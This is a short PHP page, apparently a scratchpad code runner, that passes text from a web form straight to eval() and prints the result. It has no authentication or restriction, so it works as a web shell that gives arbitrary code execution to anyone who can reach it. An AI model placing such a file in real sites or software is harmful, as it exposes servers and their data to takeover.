<?php
error_reporting(E_ALL);
ini_set('display_errors', true);

if (isset($_POST['code'])) {
	$resp = eval($_POST['code']);
	echo '<pre>' . htmlentities($resp) . '</pre>';
}
?>
<form action="" method="post">
	<textarea name="code" id="" cols="30" rows="10"><?=htmlentities(isset($_POST['code']) ? $_POST['code'] : '')?></textarea>
	<button type="submit">Run</button>
</form>
	
